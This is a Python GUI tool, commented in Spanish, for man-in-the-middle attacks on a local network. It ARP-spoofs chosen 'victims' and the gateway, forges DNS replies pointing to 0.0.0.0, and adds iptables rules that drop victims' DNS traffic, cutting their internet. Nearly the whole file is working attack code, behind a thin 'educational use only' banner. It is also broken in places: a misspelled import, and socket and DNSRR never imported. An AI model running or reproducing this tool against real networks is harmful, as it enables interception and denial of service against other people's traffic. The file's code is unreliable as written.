

import tkinter as tk
rom tkinter import scrolledtext, messagebox, ttk
from scapy.all import ARP, Ether, send, srp, sniff, DNS, DNSQR, IP, UDP
import time
import threading
import uuid
import os
import random
import sys
import subprocess

# ============== CONFIGURACIÓN GLOBAL ==============
ip_puerta_enlace = None
ip_atacante = None
mac_atacante = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0, 8*6, 8)][::-1])

# Diccionario thread-safe para múltiples objetivos
# Ahora incluye hilos de DNS y estado de bloqueo
objetivos = {}
objetivos_lock = threading.Lock()
log_lock = threading.Lock()

# Flags de modo
modo_dns_activo = False
modo_bloqueo_total = False

# ============== FUNCIONES DE RED ==============

def obtener_ip_local():
    """Obtiene IP local de forma robusta"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def obtener_mac(ip, retries=3):
    """Obtiene MAC con reintentos"""
    for _ in range(retries):
        try:
            solicitud_arp = ARP(pdst=ip)
            ether = Ether(dst="ff:ff:ff:ff:ff:ff")
            paquete = ether / solicitud_arp
            resultado = srp(paquete, timeout=2, verbose=0)[0]
            for _, recibido in resultado:
                return recibido.hwsrc
        except:
            pass
        time.sleep(0.3)
    return None

def obtener_puerta_enlace():
    """Obtiene gateway"""
    try:
        gateway = os.popen("ip route | grep default | awk '{print $3}' | head -n1").read().strip()
        if gateway:
            return gateway
        gateway = os.popen("route -n | grep '^0.0.0.0' | awk '{print $2}' | head -n1").read().strip()
        return gateway
    except:
        return None

def verificar_root():
    """Verifica root"""
    try:
        return os.geteuid() == 0
    except:
        return True

def habilitar_ip_forwarding():
    """Habilita el forwarding de paquetes (necesario para MITM)"""
    try:
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
        return True
    except:
        return False

# ============== DNS SPOOFING / BLOQUEO ==============

def dns_spoof_handler(pkt, ip_victima, widget_salida, nombre_victima):
    """
    Manejador de paquetes DNS: responde con IP falsa (bloqueo)
    """
    global ip_atacante

    if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0:  # Es una consulta (query)
        try:
            dominio = pkt.getlayer(DNSQR).qname.decode('utf-8', errors='ignore').rstrip('.')

            # No bloquear consultas ARPA (reverse DNS)
            if "in-addr.arpa" in dominio:
                return

            # Loguear el intento
            with log_lock:
                widget_salida.insert(tk.END, f"[{nombre_victima}] DNS Query: {dominio} -> BLOQUEADO\n")
                widget_salida.see(tk.END)

            # Construir respuesta DNS falsa
            # Respondemos con 0.0.0.0 (localhost) para que falle la conexión
            # O con la IP del atacante si queremos redirigir a una página de "bloqueo"
            respuesta_ip = "0.0.0.0"  # O usar ip_atacante para redirigir

            # Crear paquete de respuesta DNS
            respuesta = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                       UDP(dport=pkt[UDP].sport, sport=53) / \
                       DNS(
                           id=pkt[DNS].id,
                           qr=1,  # Es respuesta
                           aa=1,  # Autoritativa
                           qd=DNSQR(qname=dominio),
                           an=DNSRR(rrname=dominio, ttl=10, rdata=respuesta_ip)
                       )

            send(respuesta, verbose=0)

        except Exception as e:
            pass  # Silencioso para no saturar log

def dns_sniffer(ip_victima, evento_stop, widget_salida, nombre_victima):
    """
    Sniffer DNS específico para una víctima
    """
    filtro = f"udp port 53 and host {ip_victima}"

    def handler(pkt):
        if evento_stop.is_set():
            return True  # Detener sniff
        dns_spoof_handler(pkt, ip_victima, widget_salida, nombre_victima)
        return False

    try:
        sniff(
            filter=filtro,
            prn=handler,
            stop_filter=lambda x: evento_stop.is_set(),
            store=0,
            timeout=1  # Timeout corto para chequear evento frecuentemente
        )
    except Exception as e:
        with log_lock:
            widget_salida.insert(tk.END, f"[{nombre_victima}] DNS Sniff error: {e}\n")
            widget_salida.see(tk.END)

# ============== BLOQUEO CON IPTABLES ==============

def bloquear_dns_iptables(ip_victima, accion="add"):
    """
    Bloquea el DNS de la víctima usando iptables (más eficiente que sniffing)
    accion: 'add' para bloquear, 'remove' para desbloquear
    """
    try:
        if accion == "add":
            # Bloquear consultas DNS salientes de la víctima
            cmd = f"iptables -A FORWARD -s {ip_victima} -p udp --dport 53 -j DROP"
            os.system(cmd)
            cmd = f"iptables -A FORWARD -s {ip_victima} -p tcp --dport 53 -j DROP"
            os.system(cmd)
            # Bloquear HTTPS (puerto 443) - opcional para cortar todo
            # cmd = f"iptables -A FORWARD -s {ip_victima} -p tcp --dport 443 -j DROP"
            # os.system(cmd)
        else:
            # Eliminar reglas (esto es más complejo, requiere guardar índices)
            # Por simplicidad, limpiamos todas las reglas del FORWARD (cuidado en producción)
            pass
        return True
    except:
        return False

def limpiar_iptables():
    """Limpia reglas de iptables (uso con cuidado)"""
    os.system("iptables -F FORWARD 2>/dev/null")
    os.system("iptables -F INPUT 2>/dev/null")
    os.system("iptables -F OUTPUT 2>/dev/null")

# ============== ARP SPOOFING MEJORADO ==============

def arp_spoofing_loop(ip_objetivo, mac_objetivo, evento_stop, widget_salida, nombre, modo_dns, modo_bloqueo):
    """
    Loop principal de ARP spoofing + gestión de DNS
    """
    global ip_puerta_enlace, mac_atacante, ip_atacante

    # Cachear MAC de gateway
    mac_gateway = obtener_mac(ip_puerta_enlace)
    if not mac_gateway:
        log_message(f"[{nombre}] ERROR: No se pudo obtener MAC de gateway")
        return

    # Habilitar forwarding si no está habilitado
    habilitar_ip_forwarding()

    # Si modo bloqueo iptables está activo, aplicar reglas
    if modo_bloqueo:
        bloquear_dns_iptables(ip_objetivo, "add")
        log_message(f"[{nombre}] 🚫 DNS Bloqueado vía iptables")

    # Iniciar sniffer DNS si está activo (modo alternativo o complementario)
    hilo_dns = None
    evento_dns = None
    if modo_dns and not modo_bloqueo:  # Si usamos iptables, no hace falta sniffear
        evento_dns = threading.Event()
        hilo_dns = threading.Thread(
            target=dns_sniffer,
            args=(ip_objetivo, evento_dns, widget_salida, nombre),
            daemon=True
        )
        hilo_dns.start()
        log_message(f"[{nombre}] 🔍 DNS Spoofing activado")

    paquetes = 0
    errores = 0

    try:
        while not evento_stop.is_set() and errores < 5:
            try:
                # Enviar ARP spoofing
                # A víctima (somos gateway)
                send(ARP(
                    pdst=ip_objetivo, hwdst=mac_objetivo,
                    psrc=ip_puerta_enlace, hwsrc=mac_atacante, op=2
                ), verbose=0)

                time.sleep(0.05)

                # A gateway (somos víctima)
                send(ARP(
                    pdst=ip_puerta_enlace, hwdst=mac_gateway,
                    psrc=ip_objetivo, hwsrc=mac_atacante, op=2
                ), verbose=0)

                paquetes += 2

                # Log cada 3 ciclos
                if paquetes % 6 == 0:
                    estado = "🟢 ARP+DNS" if (modo_dns or modo_bloqueo) else "🟢 ARP"
                    log_message(f"[{nombre}] {estado} | Pkt:{paquetes}")

                # Intervalo aleatorio 2-4 segundos
                evento_stop.wait(random.uniform(2.0, 4.0))

            except Exception as e:
                errores += 1
                time.sleep(1)
    finally:
        # Limpieza
        if evento_dns:
            evento_dns.set()

        if modo_bloqueo:
            # Nota: Limpiar iptables específico es complejo, 
            # por eso tenemos el botón de emergencia global
            pass

        log_message(f"[{nombre}] 🔄 Restaurando ARP...")
        restaurar_arp(ip_objetivo, mac_objetivo, mac_gateway, nombre)

def restaurar_arp(ip_objetivo, mac_objetivo, mac_gateway, nombre):
    """Restaura tablas ARP"""
    global ip_puerta_enlace
    try:
        for _ in range(5):
            send(ARP(pdst=ip_objetivo, hwdst=mac_objetivo, 
                    psrc=ip_puerta_enlace, hwsrc=mac_gateway, op=2), verbose=0)
            send(ARP(pdst=ip_puerta_enlace, hwdst=mac_gateway,
                    psrc=ip_objetivo, hwsrc=mac_objetivo, op=2), verbose=0)
            time.sleep(0.5)
        log_message(f"[{nombre}] ✅ Restaurado")
    except Exception as e:
        log_message(f"[{nombre}] ⚠ Error restaurando: {e}")

# ============== CONTROLADORES GUI ==============

def log_message(msg):
    """Log thread-safe"""
    with log_lock:
        widget_salida.insert(tk.END, msg + "\n")
        widget_salida.see(tk.END)

def agregar_objetivo():
    """Agrega objetivo"""
    global objetivos, ip_puerta_enlace

    ip = entrada_ip.get().strip()
    nombre = entrada_nombre.get().strip() or f"Victima_{len(objetivos)+1}"

    if not ip:
        messagebox.showwarning("Error", "Ingrese IP")
        return

    if ip == ip_puerta_enlace:
        messagebox.showerror("Error", "No puede atacar la gateway")
        return

    try:
        octetos = ip.split('.')
        if len(octetos) != 4 or not all(o.isdigit() and 0 <= int(o) <= 255 for o in octetos):
            raise ValueError
    except:
        messagebox.showwarning("Error", "IP inválida")
        return

    with objetivos_lock:
        if ip in objetivos:
            messagebox.showwarning("Error", "IP ya existe")
            return

    log_message(f"🔍 Escaneando {ip}...")
    ventana.update()

    mac = obtener_mac(ip)
    if not mac:
        messagebox.showwarning("No responde", f"{ip} no responde a ARP")
        return

    with objetivos_lock:
        objetivos[ip] = {
            'nombre': nombre, 'mac': mac, 'evento': threading.Event(),
            'hilo': None, 'activo': False, 'hilo_dns': None, 'evento_dns': None
        }

    entrada_ip.delete(0, tk.END)
    entrada_nombre.delete(0, tk.END)
    log_message(f"✅ {nombre}: {ip} ({mac}) agregado")
    actualizar_lista()

def iniciar_ataque_ip(ip):
    """Inicia ataque con modo seleccionado"""
    global objetivos, modo_dns_activo, modo_bloqueo_total

    with objetivos_lock:
        if ip not in objetivos or objetivos[ip]['activo']:
            return

        datos = objetivos[ip]
        datos['activo'] = True
        datos['evento'] = threading.Event()  # Nuevo evento

        # Obtener modo seleccionado para esta víctima
        modo = datos.get('modo_var', tk.StringVar(value="arp")).get()

        usar_dns = (modo == "dns" or modo == "total")
        usar_bloqueo = (modo == "bloqueo" or modo == "total")

        hilo = threading.Thread(
            target=arp_spoofing_loop,
            args=(ip, datos['mac'], datos['evento'], widget_salida, datos['nombre'], usar_dns, usar_bloqueo),
            daemon=True
        )
        datos['hilo'] = hilo
        hilo.start()

    tipo_ataque = ""
    if usar_bloqueo:
        tipo_ataque = "ARP+BLOQUEO DNS"
    elif usar_dns:
        tipo_ataque = "ARP+DNS SPOOF"
    else:
        tipo_ataque = "ARP"

    log_message(f"🚀 [{objetivos[ip]['nombre']}] {tipo_ataque} INICIADO")
    actualizar_lista()

def detener_ataque_ip(ip):
    """Detiene ataque"""
    global objetivos

    with objetivos_lock:
        if ip not in objetivos or not objetivos[ip]['activo']:
            return

        datos = objetivos[ip]
        datos['activo'] = False
        datos['evento'].set()

        if datos['hilo'] and datos['hilo'].is_alive():
            hilo_temp = datos['hilo']
        else:
            hilo_temp = None

    if hilo_temp:
        hilo_temp.join(timeout=5)

    log_message(f"🛑 [{objetivos[ip]['nombre']}] Detenido")
    actualizar_lista()

def eliminar_objetivo(ip):
    """Elimina objetivo"""
    global objetivos

    with objetivos_lock:
        if ip not in objetivos:
            return

        datos = objetivos[ip]
        nombre = datos['nombre']

        if datos['activo']:
            datos['activo'] = False
            datos['evento'].set()
            if datos['hilo'] and datos['hilo'].is_alive():
                datos['hilo'].join(timeout=3)

        del objetivos[ip]

    log_message(f"🗑 {nombre} eliminado")
    actualizar_lista()

def iniciar_todos():
    """Inicia todos"""
    with objetivos_lock:
        ips = [ip for ip in objetivos if not objetivos[ip]['activo']]

    for ip in ips:
        iniciar_ataque_ip(ip)
        time.sleep(0.5)

def detener_todos():
    """Detiene todos"""
    with objetivos_lock:
        ips = [ip for ip, d in objetivos.items() if d['activo']]

    for ip in ips:
        detener_ataque_ip(ip)
        time.sleep(0.2)

def emergencia():
    """Restauración total"""
    global ip_puerta_enlace

    log_message("\n" + "="*50)
    log_message("🚨 EMERGENCIA - RESTAURANDO RED")
    log_message("="*50)

    detener_todos()
    time.sleep(1)

    # Limpiar iptables
    limpiar_iptables()
    log_message("🧹 iptables limpiado")

    # Restaurar ARP
    mac_gw = obtener_mac(ip_puerta_enlace)
    if mac_gw:
        with objetivos_lock:
            for ip, datos in objetivos.items():
                try:
                    for _ in range(8):
                        send(ARP(pdst=ip, hwdst=datos['mac'], psrc=ip_puerta_enlace, hwsrc=mac_gw, op=2), verbose=0)
                        send(ARP(pdst=ip_puerta_enlace, hwdst=mac_gw, psrc=ip, hwsrc=datos['mac'], op=2), verbose=0)
                        time.sleep(0.2)
                    log_message(f"✅ {datos['nombre']} restaurado")
                except:
                    pass

    log_message("="*50)
    log_message("✅ RED RESTAURADA\n")
    messagebox.showinfo("Listo", "Emergencia completada")

def actualizar_lista():
    """Actualiza GUI"""
    for widget in frame_lista.winfo_children():
        widget.destroy()

    with objetivos_lock:
        if not objetivos:
            tk.Label(frame_lista, text="Sin objetivos", fg="gray", bg="white").pack(pady=20)
            return
        items = list(objetivos.items())

    for ip, d in items:
        color = "#ff6b6b" if d['activo'] else "#f0f0f0"  # Rojo si está atacando
        estado = "🔴 ATACANDO" if d['activo'] else "⚪ INACTIVO"

        frame = tk.Frame(frame_lista, bg=color, padx=5, pady=3, relief=tk.RIDGE, bd=2)
        frame.pack(fill=tk.X, pady=2, padx=5)

        # Info
        tk.Label(frame, text=f"{d['nombre']} | {ip} | {d['mac'][:17]}... | {estado}", 
                bg=color, width=55, anchor="w", font=("Consolas", 9, "bold" if d['activo'] else "normal")).pack(side=tk.LEFT)

        # Controles
        btn_frame = tk.Frame(frame, bg=color)
        btn_frame.pack(side=tk.RIGHT)

        if not d['activo']:
            # Selector de modo
            modo_var = tk.StringVar(value=d.get('modo', 'arp'))
            d['modo_var'] = modo_var
            menu = ttk.OptionMenu(btn_frame, modo_var, "arp", "arp", "dns", "bloqueo", "total")
            menu.config(width=8)
            menu.pack(side=tk.LEFT, padx=2)

            tk.Button(btn_frame, text="▶", bg="green", fg="white", width=3,
                     command=lambda i=ip: iniciar_ataque_ip(i)).pack(side=tk.LEFT, padx=2)
        else:
            modo_txt = d.get('modo_var', tk.StringVar(value="arp")).get().upper()
            tk.Label(btn_frame, text=modo_txt, bg=color, font=("Arial", 8, "bold")).pack(side=tk.LEFT, padx=5)
            tk.Button(btn_frame, text="⏹", bg="orange", width=3,
                     command=lambda i=ip: detener_ataque_ip(i)).pack(side=tk.LEFT, padx=2)

        tk.Button(btn_frame, text="🗑", fg="red", width=3,
                 command=lambda i=ip: eliminar_objetivo(i)).pack(side=tk.LEFT, padx=2)

def on_close():
    """Cierre seguro"""
    with objetivos_lock:
        activos = sum(1 for d in objetivos.values() if d['activo'])

    if activos > 0:
        resp = messagebox.askyesnocancel("Salir", f"Hay {activos} ataques activos.\n¿Restaurar todo?")
        if resp is True:
            emergencia()
            ventana.destroy()
        elif resp is False:
            ventana.destroy()
    else:
        ventana.destroy()

# ============== MAIN ==============

def inicializar():
    global ip_puerta_enlace, ip_atacante

    if not verificar_root():
        messagebox.showerror("ERROR", "Ejecutar como root:\nsudo python3 mitm.py")
        sys.exit(1)

    ip_puerta_enlace = obtener_puerta_enlace()
    ip_atacante = obtener_ip_local()

    if not ip_puerta_enlace:
        messagebox.showerror("ERROR", "No gateway detectada")
        sys.exit(1)

    habilitar_ip_forwarding()

    label_info.config(text=f"Gateway: {ip_puerta_enlace} | Tu IP: {ip_atacante} | MAC: {mac_atacante}")

    log_message("="*60)
    log_message("🔥 MITM COMPLETO: ARP Spoofing + DNS Bloqueo")
    log_message("="*60)
    log_message("MODO ARP: Solo intercepta tráfico")
    log_message("MODO DNS: Responde consultas DNS con 0.0.0.0 (webs no cargan)")
    log_message("MODO BLOQUEO: Bloquea puerto 53 via iptables (corta DNS)")
    log_message("MODO TOTAL: ARP + Bloqueo completo")
    log_message("="*60)
    log_message("⚠️  SOLO USO EDUCATIVO - LABORATORIO CONTROLADO\n")

# GUI
ventana = tk.Tk()
ventana.title("MITM Total - ARP + DNS Spoofing (Laboratorio)")
ventana.geometry("900x700")

# Header
tk.Label(ventana, text="🔥 MITM TOTAL - BLOQUEO DE INTERNET", 
        bg="#c0392b", fg="white", font=("Arial", 14, "bold"), pady=10).pack(fill=tk.X)

label_info = tk.Label(ventana, text="Inicializando...", bg="#e74c3c", fg="white", pady=5)
label_info.pack(fill=tk.X)

# Input
frame_input = tk.LabelFrame(ventana, text="Nueva Víctima", padx=10, pady=10)
frame_input.pack(pady=10, padx=10, fill=tk.X)

tk.Label(frame_input, text="IP:").grid(row=0, column=0)
entrada_ip = tk.Entry(frame_input, width=18, font=("Consolas", 11))
entrada_ip.grid(row=0, column=1, padx=5)
entrada_ip.insert(0, "192.168.1.")

tk.Label(frame_input, text="Nombre:").grid(row=0, column=2)
entrada_nombre = tk.Entry(frame_input, width=15, font=("Consolas", 11))
entrada_nombre.grid(row=0, column=3, padx=5)

tk.Button(frame_input, text="➕ Agregar Víctima", command=agregar_objetivo, 
         bg="#2980b9", fg="white", font=("Arial", 10, "bold")).grid(row=0, column=4, padx=10)

# Lista
frame_lista_container = tk.LabelFrame(ventana, text="Víctimas (seleccionar modo antes de iniciar)", padx=5, pady=5)
frame_lista_container.pack(pady=5, padx=10, fill=tk.X)

frame_lista = tk.Frame(frame_lista_container, bg="white")
frame_lista.pack(fill=tk.X)

# Controles globales
tk.Button(ventana, text="▶️ INICIAR TODOS", command=iniciar_todos, 
         bg="#27ae60", fg="white", width=20, font=("Arial", 10, "bold")).pack(pady=5)

tk.Button(ventana, text="⏹️ DETENER TODOS", command=detener_todos, 
         bg="#f39c12", fg="white", width=20, font=("Arial", 10, "bold")).pack(pady=5)

tk.Button(ventana, text="🚨 RESTAURAR RED (EMERGENCIA)", command=emergencia, 
         bg="#c0392b", fg="white", width=30, font=("Arial", 11, "bold")).pack(pady=10)

# Log
frame_log = tk.LabelFrame(ventana, text="Log de Actividad", padx=5, pady=5)
frame_log.pack(pady=5, padx=10, fill=tk.BOTH, expand=True)

widget_salida = scrolledtext.ScrolledText(frame_log, width=100, height=20, 
                                         font=("Consolas", 9), bg="#2c3e50", fg="#00ff00")
widget_salida.pack(fill=tk.BOTH, expand=True)

# Setup
ventana.protocol("WM_DELETE_WINDOW", on_close)
inicializar()
ventana.mainloop()
